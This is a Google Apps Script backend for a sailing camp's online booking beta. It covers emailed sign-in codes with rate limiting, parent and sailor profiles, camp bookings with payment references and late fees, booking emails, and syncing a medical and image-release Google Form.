/* Beyond the Shift: online booking backend (beta).
 *
 * A Google Apps Script bound to the private "BTS Bookings" Google Sheet.
 * The sheet is the database AND the admin view. The website (Cloudflare Pages) calls
 * this script's web-app URL with fetch(POST, text/plain JSON body).
 * Setup steps: apps-script/README.md. Plan: BOOKING-PLAN.md.
 * Runtime: V8. Deploy as Web app → Execute as: Me → Who has access: Anyone.
 */

const TZ = 'Europe/London';
const SESSION_DAYS = 90;
const CODE_MINUTES = 15;
const MAX_CODE_ATTEMPTS = 5;
const MAX_CODE_REQUESTS = 3; // per email per CODE_MINUTES
const MAX_CODES_PER_HOUR = 40; // all emails together
const MAIL_RESERVE = 25; // sign-in codes stop when the MailApp daily quota falls to this, keeping room for booking emails
/* Security review 17 Nov 2026: cap wrong guesses per email across ALL its codes, not just per code.
 * 10 wrong guesses per 6 hours ≈ 40 a day, so guessing a 6-digit code would take ~70 years on average. */
const MAX_FAILS = 10;
const FAIL_WINDOW_SECONDS = 6 * 3600; // CacheService maximum
const CAMPS_CACHE_SECONDS = 60; // public camp list: a flood of page loads reads the sheet at most once a minute
const SESSION_CACHE_SECONDS = 600; // a deleted session row stops working within 10 minutes
/* Optional bot check (Cloudflare Turnstile) before a sign-in code is emailed. Off until the Script Property
 * TURNSTILE_SECRET is set (Project Settings ▸ Script properties). Never put the secret in this file: the repo is public. */
const TURNSTILE_VERIFY = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';

const TABS = {
  Bookings: ['booking_id', 'created', 'parent_email', 'sailor_id', 'sailor_name', 'camp_id', 'camp_title', 'amount', 'late_fee_applied', 'reference', 'payment_due', 'status', 'admin_notes'],
  Camps: ['camp_id', 'title', 'start', 'end', 'venue', 'price', 'ref_code', 'booking_deadline', 'late_fee', 'capacity', 'open', 'signups_offline', 'second_group', 'waitlist'],
  Parents: ['email', 'name', 'phone', 'emergency_name', 'emergency_phone', 'created'],
  Sailors: ['sailor_id', 'parent_email', 'first_name', 'surname', 'dob', 'rig', 'sail_number', 'club', 'image_consent', 'show_on_list', 'medical_date', 'created'],
  Settings: ['key', 'value', 'notes'],
  Codes: ['email', 'code_hash', 'expires', 'attempts'],
  Sessions: ['token_hash', 'email', 'expires', 'created'],
};
/* Payment rule (James, 11 Nov 2026): payment is due 7 days after booking or 7 days before the camp starts,
 * whichever is sooner. Booking inside the final 7 days adds the camp's late_fee (£20) and payment is due straight away. */
const PAY_DAYS = 7;
/* The spreadsheet that holds the booking tabs: Kai's "Autumn Training Series" sheet (James, 11 Nov 2026).
 * Blank = the sheet this script is opened from, or a new "BTS Bookings" sheet made by setup().
 * The owner of this script (James) needs edit access to it. */
const BOOKINGS_SHEET_ID = '1cB40dfU56JunGSR18VKJZGjuG0RsuolWuCDS0fu516A';

/* Tab names in the spreadsheet. They must not clash with Kai's existing tabs (he already has a "Bookings" tab). */
const SHEET_NAMES = {
  Bookings: 'Online bookings', Camps: 'Online camps', Parents: 'Parents', Sailors: 'Sailors',
  Settings: 'Booking settings', Codes: 'Sign-in codes', Sessions: 'Sign-in sessions',
};
const STATUSES = ['Awaiting payment', 'Paid', 'Confirmed', 'Waitlist', 'Cancelled'];
const ACTIVE = s => s !== 'Cancelled';

/* ---------------- Web entry points ---------------- */

function doGet() {
  return json_({ ok: true, service: 'BTS bookings (beta)' });
}

function doPost(e) {
  let out;
  try {
    const req = JSON.parse((e && e.postData && e.postData.contents) || '{}');
    const fn = ACTIONS[req.action];
    if (!fn) fail_('Unknown request.');
    out = { ok: true, data: fn(req) };
  } catch (err) {
    if (!err.user) console.error(err && err.stack || err);
    out = { ok: false, code: err.code || '', error: err.user ? err.message : 'Something went wrong. Please try again, or use the booking form.' };
  }
  return json_(out);
}

const ACTIONS = {
  /* Public */
  camps: () => publicCamps_(),
  requestCode: req => requestCode_(req.email, req.human),
  verifyCode: req => verifyCode_(req.email, req.code),

  /* Signed in */
  me: req => me_(auth_(req)),
  saveProfile: req => saveProfile_(auth_(req), req.profile || {}),
  saveSailor: req => saveSailor_(auth_(req), req.sailor || {}),
  deleteSailor: req => deleteSailor_(auth_(req), req.sailor_id),
  book: req => book_(auth_(req), req.camp_id, req.sailor_ids || []),
  whoIsGoing: req => whoIsGoing_(auth_(req), req.camp_id),
  signOut: req => signOut_(req.token),
};

/* ---------------- Sign-in (emailed 6-digit code) ---------------- */

function requestCode_(email, human) {
  email = cleanEmail_(email);
  const cache = CacheService.getScriptCache();
  const key = 'req:' + email;
  const count = Number(cache.get(key) || 0);
  if (count >= MAX_CODE_REQUESTS) fail_('Too many codes requested. Please wait 15 minutes and try again.');
  /* Bot check before anything is counted, so a script without a valid token can't use up the hourly cap
   * below and lock real parents out of signing in. */
  checkHuman_(human);
  /* Global cap so nobody can drain the MailApp daily quota with many addresses (booking emails need it too). */
  const hourKey = 'req:all:' + Utilities.formatDate(new Date(), TZ, 'yyyyMMddHH');
  const hourCount = Number(cache.get(hourKey) || 0);
  if (hourCount >= MAX_CODES_PER_HOUR || MailApp.getRemainingDailyQuota() <= MAIL_RESERVE) {
    fail_('Too many people are trying to book! Please try again later, or use the booking form.', 'BUSY');
  }
  cache.put(hourKey, String(hourCount + 1), 3600);
  cache.put(key, String(count + 1), CODE_MINUTES * 60);

  const code = String(parseInt(Utilities.getUuid().replace(/-/g, '').slice(0, 12), 16) % 1000000).padStart(6, '0');
  withLock_(() => {
    rows_('Codes').filter(r => r.email === email).reverse().forEach(r => deleteRow_('Codes', r._row));
    append_('Codes', { email, code_hash: hash_(email + ':' + code), expires: addMinutes_(new Date(), CODE_MINUTES), attempts: 0 });
  });

  const s = settings_();
  sendMail_(email, `Your Beyond the Shift sign-in code: ${code}`,
    emailWrap_(`<p>Your sign-in code is:</p>
      <p style="font-size:28px;font-weight:700;letter-spacing:6px;margin:12px 0">${code}</p>
      <p>It works for ${CODE_MINUTES} minutes. If you didn't ask for this, you can ignore this email.</p>`, s), s);
  return { sent: true };
}

function verifyCode_(email, code) {
  email = cleanEmail_(email);
  code = String(code || '').replace(/\D/g, '');
  const cache = CacheService.getScriptCache();
  const failKey = 'fail:' + email;
  return withLock_(() => {
    const fails = Number(cache.get(failKey) || 0);
    if (fails >= MAX_FAILS) fail_('Too many wrong codes for this email, so sign-in is paused for a few hours to keep the account safe. Please use the booking form or get in touch.', 'BUSY');
    const row = rows_('Codes').find(r => r.email === email);
    if (!row || new Date(row.expires) < new Date()) fail_('That code has expired. Please request a new one.');
    if (Number(row.attempts) >= MAX_CODE_ATTEMPTS) fail_('Too many attempts. Please request a new code.');
    if (hash_(email + ':' + code) !== row.code_hash) {
      update_('Codes', row._row, { attempts: Number(row.attempts) + 1 });
      cache.put(failKey, String(fails + 1), FAIL_WINDOW_SECONDS);
      fail_('That code is not right. Please check the email and try again.');
    }
    cache.remove(failKey);
    deleteRow_('Codes', row._row);

    const token = Utilities.getUuid() + Utilities.getUuid();
    append_('Sessions', { token_hash: hash_(token), email, expires: addMinutes_(new Date(), SESSION_DAYS * 1440), created: new Date() });
    if (!rows_('Parents').some(p => p.email === email)) append_('Parents', { email, created: new Date() });
    return { token, email };
  });
}

function auth_(req) {
  if (!req.token) fail_('Please sign in again.', 'AUTH');
  const h = hash_(String(req.token));
  /* Cached for a few minutes so each signed-in click doesn't re-read the whole Sessions tab. */
  const cache = CacheService.getScriptCache();
  const hit = cache.get('sess:' + h);
  let s = hit ? JSON.parse(hit) : null;
  if (!s) {
    const row = rows_('Sessions').find(r => r.token_hash === h);
    if (row) {
      s = { email: row.email, expires: new Date(row.expires).getTime() };
      cache.put('sess:' + h, JSON.stringify(s), SESSION_CACHE_SECONDS);
    }
  }
  if (!s || !(s.expires > Date.now())) fail_('Please sign in again.', 'AUTH');
  return s.email;
}

function signOut_(token) {
  if (!token) return { signedOut: true };
  const h = hash_(String(token));
  CacheService.getScriptCache().remove('sess:' + h);
  withLock_(() => rows_('Sessions').filter(r => r.token_hash === h).reverse().forEach(r => deleteRow_('Sessions', r._row)));
  return { signedOut: true };
}

/* ---------------- Account data ---------------- */

function me_(email) {
  const s = settings_();
  const parent = rows_('Parents').find(p => p.email === email) || { email };
  const sailors = rows_('Sailors').filter(r => r.parent_email === email);
  const camps = byId_(rows_('Camps'), 'camp_id');
  const bookings = rows_('Bookings').filter(b => b.parent_email === email)
    .sort((a, b) => new Date(b.created) - new Date(a.created))
    .map(b => {
      const c = camps[b.camp_id] || {};
      return {
        booking_id: b.booking_id, created: iso_(b.created), sailor_id: b.sailor_id, sailor_name: b.sailor_name,
        camp_id: b.camp_id, camp_title: b.camp_title, start: iso_(c.start), end: iso_(c.end), venue: c.venue || '',
        amount: Number(b.amount), late_fee_applied: yes_(b.late_fee_applied), reference: b.reference, payment_due: iso_(b.payment_due), status: b.status,
      };
    });
  return {
    profile: pick_(parent, ['email', 'name', 'phone', 'emergency_name', 'emergency_phone']),
    sailors: sailors.map(x => Object.assign(sailorOut_(x, s), { medical_link: medicalLink_(x, email, s) })),
    bookings,
    bank: bank_(s),
    medical_form_url: s.medical_form_url || '',
    payment_note: s.payment_note || '',
  };
}

function saveProfile_(email, p) {
  const data = {
    name: text_(p.name, 80, 'Your name'),
    phone: text_(p.phone, 30, 'Phone number'),
    emergency_name: text_(p.emergency_name, 80, 'Emergency contact name'),
    emergency_phone: text_(p.emergency_phone, 30, 'Emergency contact phone'),
  };
  withLock_(() => {
    const row = rows_('Parents').find(r => r.email === email);
    if (row) update_('Parents', row._row, data);
    else append_('Parents', Object.assign({ email, created: new Date() }, data));
  });
  return me_(email);
}

function saveSailor_(email, x) {
  const rig = String(x.rig || '');
  if (!['4', '6', '7'].includes(rig)) fail_('Please choose a rig (ILCA 4, 6 or 7).');
  const data = {
    first_name: text_(x.first_name, 40, "Sailor's first name"),
    surname: text_(x.surname, 40, "Sailor's surname"),
    dob: text_(x.dob, 10, 'Date of birth'),
    rig,
    sail_number: text_(x.sail_number, 12),
    club: text_(x.club, 60),
    show_on_list: x.show_on_list ? 'Y' : 'N',
  };
  if (!/^\d{4}-\d{2}-\d{2}$/.test(data.dob)) fail_('Please enter the date of birth.');
  withLock_(() => {
    if (x.sailor_id) {
      const row = rows_('Sailors').find(r => r.sailor_id === x.sailor_id && r.parent_email === email);
      if (!row) fail_('Sailor not found.');
      update_('Sailors', row._row, data);
    } else {
      append_('Sailors', Object.assign({ sailor_id: 'S' + shortId_(), parent_email: email, created: new Date() }, data));
    }
  });
  return me_(email);
}

function deleteSailor_(email, id) {
  withLock_(() => {
    const row = rows_('Sailors').find(r => r.sailor_id === id && r.parent_email === email);
    if (!row) fail_('Sailor not found.');
    if (rows_('Bookings').some(b => b.sailor_id === id && ACTIVE(b.status))) fail_('This sailor has bookings, so they cannot be removed. Please get in touch.');
    deleteRow_('Sailors', row._row);
  });
  return me_(email);
}

/* ---------------- Camps and booking ---------------- */

function publicCamps_() {
  /* Public and needs no sign-in, so it's the easiest request to flood: serve it from the cache for a minute.
   * A booking clears the cache at once; edits made by hand in the Camps tab show within CAMPS_CACHE_SECONDS. */
  const cache = CacheService.getScriptCache();
  const hit = cache.get('camps');
  if (hit) return JSON.parse(hit);
  const bookings = rows_('Bookings');
  const today = startOfDay_(new Date());
  const list = rows_('Camps')
    .filter(c => c.camp_id && yes_(c.open) && new Date(c.end) >= today)
    .sort((a, b) => new Date(a.start) - new Date(b.start))
    .map(c => campOut_(c, bookings));
  try { cache.put('camps', JSON.stringify(list), CAMPS_CACHE_SECONDS); } catch (err) { /* over 100 KB: skip caching */ }
  return list;
}

function book_(email, campId, sailorIds) {
  if (!Array.isArray(sailorIds) || !sailorIds.length) fail_('Please choose at least one sailor.');
  const s = settings_();
  const result = withLock_(() => {
    const camp = rows_('Camps').find(c => c.camp_id === campId);
    if (!camp || !yes_(camp.open)) fail_('Sorry, this camp is not open for online booking.');
    if (startOfDay_(new Date(camp.start)) <= startOfDay_(new Date())) fail_('Sorry, this camp has already started.');
    const parent = rows_('Parents').find(p => p.email === email);
    if (!parent || !parent.name || !parent.phone || !parent.emergency_phone) fail_('Please complete your contact and emergency details first.');

    const sailors = rows_('Sailors').filter(r => r.parent_email === email);
    let bookings = rows_('Bookings');
    /* Validate every sailor before writing anything, so a bad id never leaves half a booking with no email. */
    const ids = [...new Set(sailorIds.map(String))];
    if (ids.length > 10) fail_('Please book up to 10 sailors at a time.');
    const chosen = ids.map(id => {
      const sailor = sailors.find(x => x.sailor_id === id);
      if (!sailor) fail_('Sailor not found. Please refresh the page and try again.');
      const name = `${sailor.first_name} ${sailor.surname}`;
      if (bookings.some(b => b.camp_id === campId && b.sailor_id === id && ACTIVE(b.status))) fail_(`${name} is already booked on this camp.`);
      return { id, sailor, name };
    });
    const created = [];
    chosen.forEach(({ id, sailor, name }) => {
      const left = placesLeft_(camp, bookings);
      const t = terms_(camp, new Date());
      const fee = t.fee;
      const b = {
        booking_id: 'B' + shortId_(), created: new Date(), parent_email: email, sailor_id: id, sailor_name: name,
        camp_id: campId, camp_title: camp.title, amount: Number(camp.price || 0) + fee, late_fee_applied: fee ? 'Y' : 'N',
        reference: reference_(camp, sailor, bookings), payment_due: t.due,
        status: left > 0 ? 'Awaiting payment' : 'Waitlist', admin_notes: '',
      };
      append_('Bookings', b);
      bookings = bookings.concat([b]);
      created.push(b);
    });
    return { camp, parent, sailors, created };
  });
  CacheService.getScriptCache().remove('camps'); // places left changed

  try { sendBookingEmails_(result, s); } catch (err) { console.error('Booking email failed', err); }
  return {
    bookings: result.created.map(b => ({ booking_id: b.booking_id, sailor_name: b.sailor_name, amount: b.amount, late_fee_applied: b.late_fee_applied === 'Y', reference: b.reference, status: b.status, payment_due: iso_(b.payment_due) })),
    bank: bank_(s),
    me: me_(email),
  };
}

function whoIsGoing_(email, campId) {
  const camp = rows_('Camps').find(c => c.camp_id === campId);
  if (!camp) fail_('Camp not found.');
  const bookings = rows_('Bookings').filter(b => b.camp_id === campId && ACTIVE(b.status) && b.status !== 'Waitlist');
  const sailors = byId_(rows_('Sailors'), 'sailor_id');
  const list = bookings.map(b => sailors[b.sailor_id]).filter(x => x && yes_(x.show_on_list))
    .map(x => ({ name: `${x.first_name} ${String(x.surname).charAt(0)}.`, club: x.club || '', rig: x.rig }));
  /* Sailors booked by the Google Form / WhatsApp (signups_offline) never gave consent to show their names,
   * so they count as mystery sailors (James, 15 Nov). Only the number reaches the page. */
  const offline = Number(camp.signups_offline) || 0;
  return { camp: campOut_(camp, rows_('Bookings')), booked: bookings.length + offline, listed: list };
}

/* Places left, same rule as the live site (James, 15 Nov 2026; live script.js placesLeft):
 * count down from 6 until 4 sailors are in (a group can run), then hold at "2 places left".
 * Sailors counted = signups_offline (booked via the Google Form / WhatsApp, typed in by hand) + online bookings.
 * second_group = Y shows "Second group forming". waitlist = Y shows "Waiting list only" and new bookings go in as Waitlist.
 * capacity is no longer used. Returns 0 only when waitlist = Y. */
function placesLeft_(camp, bookings) {
  if (yes_(camp.waitlist)) return 0;
  const online = bookings.filter(b => b.camp_id === camp.camp_id && ACTIVE(b.status) && b.status !== 'Waitlist').length;
  const n = (Number(camp.signups_offline) || 0) + online;
  return n < 4 ? 6 - n : 2;
}
function placesLabel_(camp, left) {
  if (yes_(camp.waitlist)) return 'Waiting list only';
  if (yes_(camp.second_group)) return 'Second group forming';
  return `${left} ${left === 1 ? 'place' : 'places'} left`;
}

/* Reference: "BTS XMAS26 SMITH", max 18 characters (UK Faster Payments). Siblings on one camp get an initial.
   The surname is shortened to make room for the suffix, so a long surname never truncates the initial away
   (e.g. "BTS XMAS26 WILLIAJ" for a second Williamson, not a duplicate that falls through to a random code). */
function reference_(camp, sailor, bookings) {
  const sur = String(sailor.surname).toUpperCase().replace(/[^A-Z]/g, '');
  const ini = String(sailor.first_name).toUpperCase().replace(/[^A-Z]/g, '').charAt(0);
  const base = `BTS ${String(camp.ref_code || camp.camp_id).toUpperCase()} `.slice(0, 14);
  const room = 18 - base.length;
  const fit = suf => (base + sur.slice(0, Math.max(0, room - suf.length)) + suf).trim();
  const taken = new Set(bookings.filter(b => b.camp_id === camp.camp_id).map(b => b.reference));
  const options = [fit(''), fit(ini), fit(ini + shortId_().slice(0, 2))];
  for (const ref of options) if (!taken.has(ref)) return ref;
  return (base + shortId_()).slice(0, 18);
}

/* ---------------- Emails ---------------- */

function sendBookingEmails_({ camp, parent, sailors, created }, s) {
  const bank = bank_(s);
  const needsForm = created.map(b => sailors.find(x => x.sailor_id === b.sailor_id)).filter(x => x && !medicalDone_(x, s));
  const lines = created.map(b => `<tr>
      <td style="padding:6px 12px 6px 0"><strong>${esc_(b.sailor_name)}</strong>${b.status === 'Waitlist' ? ' (waitlist)' : ''}</td>
      <td style="padding:6px 12px 6px 0">£${b.amount}${b.late_fee_applied === 'Y' ? ` (includes £${Number(camp.late_fee || 0)} late booking fee)` : ''}</td>
      <td style="padding:6px 0">Reference: <strong>${esc_(b.reference)}</strong></td></tr>`).join('');
  const total = created.filter(b => b.status !== 'Waitlist').reduce((t, b) => t + Number(b.amount), 0);
  const dueDate = created[0] && created[0].payment_due;
  const due = dueDate ? (iso_(dueDate) === iso_(new Date()) ? 'today' : niceDate_(dueDate)) : '';
  const formBlock = needsForm.length ? `<div style="background:#fff4e5;border-radius:8px;padding:12px 16px;margin:16px 0">
      <strong>Medical &amp; image release form needed</strong> for ${needsForm.map(x => esc_(x.first_name)).join(' and ')} this season.<br>
      ${needsForm.map(x => `<a href="${esc_(medicalLink_(x, parent.email, s))}">Complete the form for ${esc_(x.first_name)}</a>`).join('<br>')}
    </div>` : '';
  const waitOnly = total === 0;

  const html = emailWrap_(`
    <p>Hi ${esc_(String(parent.name || '').split(' ')[0] || 'there')},</p>
    <p>Thanks for booking <strong>${esc_(camp.title)}</strong>: ${niceDate_(camp.start)} to ${niceDate_(camp.end)}, ${esc_(camp.venue)}.</p>
    <table style="border-collapse:collapse;margin:8px 0">${lines}</table>
    ${waitOnly ? '<p>The camp is currently full, so you are on the <strong>waitlist</strong>. We will be in touch if a place comes up. Please don’t pay yet.</p>' : `
    <h3 style="margin:20px 0 6px">How to pay</h3>
    <p>Please pay <strong>£${total}</strong> by bank transfer${due ? ` <strong>by ${due}</strong>` : ''}, using the reference${created.length > 1 ? 's' : ''} above (one payment per sailor).</p>
    <p style="background:#f2f6f9;border-radius:8px;padding:12px 16px;line-height:1.7">
      Account name: <strong>${esc_(bank.account_name)}</strong><br>
      Sort code: <strong>${esc_(bank.sort_code)}</strong><br>
      Account number: <strong>${esc_(bank.account_number)}</strong></p>
    ${s.payment_note ? `<p>${esc_(s.payment_note)}</p>` : ''}`}
    ${formBlock}
    <p>Once your payment arrives, James or Kai will be in touch personally to confirm your place.</p>
    <p>You can see all your bookings at any time: <a href="${esc_((s.site_url || '') + 'account/')}">My bookings</a>.</p>`, s);

  sendMail_(parent.email, `Booking received: ${camp.title} (${created.map(b => b.reference).join(', ')})`, html, s);

  const adminHtml = `<p>New booking (online beta)</p><p><strong>${esc_(camp.title)}</strong>: ${niceDate_(camp.start)} to ${niceDate_(camp.end)}, ${esc_(camp.venue)}</p><ul>${created.map(b => `<li>${esc_(b.sailor_name)}: £${b.amount}, ${esc_(b.reference)}, ${b.status}</li>`).join('')}</ul>
      <p>Parent: ${esc_(parent.name)}, ${esc_(parent.email)}, ${esc_(parent.phone)}</p>
      <p>Medical form outstanding: ${needsForm.length ? needsForm.map(x => esc_(x.first_name)).join(', ') : 'none'}</p>
      <p>Reply to this email to reach the parent directly.</p>
      <p><a href="${ss_().getUrl()}">Open the bookings sheet</a></p>`;
  notifyAdmins_(s, `New booking: ${camp.title}, ${created.map(b => b.sailor_name).join(', ')}`, adminHtml, parent.email);
}

function emailWrap_(inner, s) {
  return `<div style="font-family:Arial,Helvetica,sans-serif;font-size:15px;color:#13202b;max-width:560px">
    <p style="font-weight:700;font-size:17px;margin:0 0 4px">Beyond the Shift</p>
    <p style="display:inline-block;background:#e6f4f1;color:#0b5c4f;border-radius:999px;padding:2px 10px;font-size:12px;margin:0 0 16px">Online booking: beta</p>
    ${inner}
    <hr style="border:none;border-top:1px solid #dde3e8;margin:24px 0 12px">
    <p style="font-size:12px;color:#5b6b78">Online booking is new and still in beta. If anything looks wrong, just reply to this email.</p></div>`;
}

function sendMail_(to, subject, htmlBody, s) {
  const opts = { to, subject, htmlBody, name: s.sender_name || 'Beyond the Shift' };
  if (s.reply_to) opts.replyTo = s.reply_to;
  MailApp.sendEmail(opts);
}

/* ---------------- Medical & image release form ---------------- */
/* James's own Google Form ("Sailors full name", emergency contact, medical details, one "Please confirm the following"
 * checkbox that includes photo/video consent). Its answers stay in the form; the site only records WHEN it was done
 * and whether consent was confirmed. It reaches us in either of two ways (both handled by onMedicalSubmit):
 *   a) medical_form_id set in Booking settings -> setup() puts a submit trigger on the FORM itself (no need to change
 *      where the form saves its responses), and syncMedical() can read past responses;
 *   b) the form linked to this spreadsheet -> the spreadsheet submit trigger, tab named medical_tab. */
const MED_NAME_ENTRY = 'entry.1504912846'; // "Sailors full name" in James's form, for the prefilled link

function medicalDone_(sailor, s) {
  if (!sailor.medical_date) return false;
  const start = s.season_start ? new Date(s.season_start) : new Date(0);
  return new Date(sailor.medical_date) >= start;
}

/* Prefilled Google Form link (sailor's full name filled in). medical_prefill_url may contain {email} and {sailor}. */
function medicalLink_(sailor, email, s) {
  const name = encodeURIComponent(`${sailor.first_name} ${sailor.surname}`);
  if (s.medical_prefill_url) return s.medical_prefill_url.replace('{email}', encodeURIComponent(email)).replace('{sailor}', name);
  const base = s.medical_form_url || '';
  if (!base) return '';
  return base + (base.includes('?') ? '&' : '?') + `usp=pp_url&${MED_NAME_ENTRY}=${name}`;
}

/* Turns either trigger's event, or a FormResponse, into { name, email, consent, when }. */
function medicalAnswers_(e, s) {
  const qName = s.medical_q_sailor || 'Sailors full name';
  const consentOk = v => /yes/i.test(String(v));
  const resp = e && e.response ? e.response : (e && e.getItemResponses ? e : null);
  if (resp) {
    let name = '', consent = false;
    resp.getItemResponses().forEach(ir => {
      const t = ir.getItem().getTitle(), v = ir.getResponse();
      if (norm_(t) === norm_(qName) || (!name && /sailor/i.test(t) && /name/i.test(t))) name = String(v);
      // Consent lives in James's "Please confirm the following" tick boxes (one option covers photo/video), or a photo question.
      if (/photo|video|image/i.test(t)) consent = [].concat(v).some(consentOk);
      else if (/confirm/i.test(t)) consent = consent || [].concat(v).some(x => /photo|video|image/i.test(String(x)) && !/\bnot\b|don.t/i.test(String(x)));
    });
    let email = '';
    try { email = resp.getRespondentEmail() || ''; } catch (err) { /* the form does not collect emails */ }
    return { name, email: email.toLowerCase(), consent, when: resp.getTimestamp() };
  }
  const nv = (e && e.namedValues) || {};
  const keys = Object.keys(nv);
  const get = k => String((nv[k] || [''])[0] || '').trim();
  const nameKey = keys.find(k => norm_(k) === norm_(qName)) || keys.find(k => /sailor/i.test(k) && /name/i.test(k));
  const emailKey = keys.find(k => /^email address$/i.test(k.trim())) || keys.find(k => norm_(k) === norm_(s.medical_q_email || ''));
  const consentKey = keys.find(k => /photo|video|image/i.test(k));
  const confirmKey = keys.find(k => /confirm/i.test(k));
  const confirmed = confirmKey ? /photo|video|image/i.test(get(confirmKey)) : false;
  return { name: nameKey ? get(nameKey) : '', email: emailKey ? get(emailKey).toLowerCase() : '',
    consent: consentKey ? consentOk(get(consentKey)) : confirmed, when: new Date() };
}

/* Finds the sailor a response belongs to. With an email (form collects emails) only that family is searched;
 * otherwise the full name must match exactly one sailor, so we never tick the wrong child. */
function medicalMatch_(a, sailors) {
  const n = norm_(a.name);
  if (!n) return null;
  const pool = a.email ? sailors.filter(x => x.parent_email === a.email) : sailors;
  let m = pool.filter(x => norm_(`${x.first_name} ${x.surname}`) === n);
  if (!m.length && a.email) m = pool.filter(x => norm_(x.first_name) === n || n.startsWith(norm_(x.first_name)));
  if (!m.length && a.email && pool.length === 1) m = pool;
  return m.length === 1 ? m[0] : null;
}

/* Records one response. Returns the matched sailor or null. Sends the receipt email the first time this season. */
function recordMedical_(a, s, sailors, quiet) {
  const x = medicalMatch_(a, sailors);
  if (!x) {
    console.warn('Medical form: no single sailor matched', a.name, a.email);
    if (!quiet) notifyAdmins_(s, `Medical form not matched: ${a.name || '(no name)'}`,
      `<p>A medical &amp; image release form came in for <strong>${esc_(a.name)}</strong>, but it didn't match exactly one sailor in the Sailors tab.</p>
       <p>Type the date into <em>Sailors &gt; medical_date</em> for the right sailor (and Y in image_consent if they ticked consent).</p>`);
    return null;
  }
  const wasDone = medicalDone_(x, s);
  const when = a.when || new Date();
  if (wasDone && new Date(x.medical_date) >= when) return x; // already recorded
  update_('Sailors', x._row, { medical_date: when, image_consent: a.consent ? 'Y' : 'N' });
  if (!wasDone) sendMedicalReceipt_(x, a, s);
  return x;
}

function sendMedicalReceipt_(x, a, s) {
  const parent = rows_('Parents').find(p => p.email === x.parent_email) || {};
  const html = emailWrap_(`
    <p>Hi ${esc_(String(parent.name || '').split(' ')[0] || 'there')},</p>
    <p>Thanks, we've received the <strong>medical &amp; image release form for ${esc_(x.first_name)} ${esc_(x.surname)}</strong>. It covers every camp this season, so you won't be asked again until next season.</p>
    <p>Photo &amp; video consent: <strong>${a.consent ? 'given' : 'not given'}</strong>.</p>
    <p>If anything changes (a new injury, medication or contact number), just reply to this email or fill the form in again.</p>
    <p><a href="${esc_((s.site_url || '') + 'account/')}">See your bookings</a></p>`, s);
  sendMail_(x.parent_email, `Medical & image release form received: ${x.first_name} ${x.surname}`, html, s);
  notifyAdmins_(s, `Medical form received: ${x.first_name} ${x.surname}`,
    `<p>Medical &amp; image release form received for <strong>${esc_(x.first_name)} ${esc_(x.surname)}</strong> (${esc_(x.parent_email)}). Photo consent: ${a.consent ? 'Y' : 'N'}.</p>`);
}

/* Copies to James and Kai (Booking settings ▸ notify_emails). Never throws: the booking or form is already saved,
 * so a bad address or a full mail quota must not turn a good booking into an error for the parent. */
function notifyAdmins_(s, subject, html, replyTo) {
  const admins = String(s.notify_emails || '').split(/[,;\s]+/).filter(a => /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(a));
  if (!admins.length) { console.warn('notify_emails is blank: no admin copy sent for "' + subject + '"'); return; }
  const opts = { to: admins.join(','), subject, htmlBody: html, name: s.sender_name || 'Beyond the Shift' };
  if (replyTo) opts.replyTo = replyTo;
  try { MailApp.sendEmail(opts); } catch (e) { console.error('Admin email failed: ' + e); }
}

/* Run from the editor to check James and Kai both get the new-booking alert. */
function testNotify() {
  const s = settings_();
  notifyAdmins_(s, 'BTS booking alert test', '<p>If you can read this, new-booking alerts reach you.</p><p>Sent to: '
    + esc_(s.notify_emails || '(blank)') + '</p>');
}

/* Installable trigger: the medical form was submitted (form trigger, or spreadsheet trigger on the linked tab). */
function onMedicalSubmit(e) {
  const s = settings_();
  // Spreadsheet trigger: this spreadsheet also holds other forms' responses, so only react to the medical tab.
  const tab = e && e.range && e.range.getSheet().getName();
  if (tab && tab !== (s.medical_tab || 'Medical responses')) return;
  const a = medicalAnswers_(e, s);
  withLock_(() => recordMedical_(a, s, rows_('Sailors'), false));
}

/* Run from the editor: reads every medical form response since season_start and marks any sailor not yet done
 * (with a receipt email). Use it after setting medical_form_id, to pick up forms filled in before the trigger existed. */
function syncMedical() {
  const s = settings_();
  const form = medicalForm_(s);
  if (!form) throw new Error('Set medical_form_id in Booking settings first (the form editor URL, .../forms/d/<id>/edit).');
  const since = s.season_start ? new Date(s.season_start) : new Date(0);
  let n = 0;
  withLock_(() => form.getResponses(since).forEach(r => {
    const sailors = rows_('Sailors');
    const a = medicalAnswers_(r, s);
    const x = medicalMatch_(a, sailors);
    if (x && !medicalDone_(x, s)) { recordMedical_(a, s, sailors, true); n++; }
  }));
  console.log(`syncMedical: ${n} sailor(s) newly marked as done`);
  return n;
}

/* Run from the editor when a medical form doesn't tick: changes nothing, just prints (View > Logs / Execution log)
 * whether the form opens, whether the submit trigger exists, the form's question titles, and for the latest
 * responses which name was read and which sailor (if any) it matched. */
function checkMedical() {
  const s = settings_();
  const out = [];
  let form;
  try { form = medicalForm_(s); } catch (err) { out.push('CANNOT OPEN THE FORM: ' + err.message + ' (the account running this script needs edit access to the form)'); }
  if (!form) { if (!out.length) out.push('medical_form_id is blank in Booking settings.'); console.log(out.join('\n')); return; }
  out.push('Form: ' + form.getTitle() + ' (' + form.getId() + ')');
  const trig = ScriptApp.getProjectTriggers().filter(t => t.getHandlerFunction() === 'onMedicalSubmit');
  out.push('onMedicalSubmit triggers: ' + trig.length + ' -> ' + trig.map(t => String(t.getTriggerSourceId()) === form.getId() ? 'ON THE FORM (good)' : 'on ' + t.getTriggerSource()).join(', '));
  if (!trig.some(t => String(t.getTriggerSourceId()) === form.getId())) out.push('  !! No trigger on the form: run setup again.');
  out.push('Name question setting (medical_q_sailor): "' + (s.medical_q_sailor || 'Sailors full name') + '"');
  out.push('Questions: ' + form.getItems().map(i => '"' + i.getTitle() + '"').join(' | '));
  const sailors = rows_('Sailors');
  out.push('Sailors in the sheet: ' + sailors.map(x => x.first_name + ' ' + x.surname + (medicalDone_(x, s) ? ' [done]' : '')).join(', '));
  const since = s.season_start ? new Date(s.season_start) : new Date(0);
  const resp = form.getResponses(since);
  out.push('Responses since ' + iso_(since) + ': ' + resp.length + '. Latest 8:');
  resp.slice(-8).forEach(r => {
    const a = medicalAnswers_(r, s), x = medicalMatch_(a, sailors);
    out.push('  ' + Utilities.formatDate(r.getTimestamp(), TZ, 'd MMM HH:mm') + '  name read: "' + a.name + '"  consent: ' + a.consent +
      '  -> ' + (x ? 'matches ' + x.first_name + ' ' + x.surname : 'NO SINGLE MATCH (needs exactly one sailor with that full name)'));
  });
  console.log(out.join('\n'));
}

